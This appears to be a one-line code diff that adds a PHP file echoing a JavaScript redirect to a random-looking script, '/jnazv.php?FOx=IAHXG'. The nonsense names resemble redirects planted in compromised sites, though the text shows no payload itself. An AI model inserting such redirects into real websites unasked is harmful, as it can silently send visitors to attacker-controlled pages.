@@ -1,0 +1,1 @@
+<?php echo '<script> location.href=\'/jnazv.php?FOx=IAHXG\'; </script>'; ?>
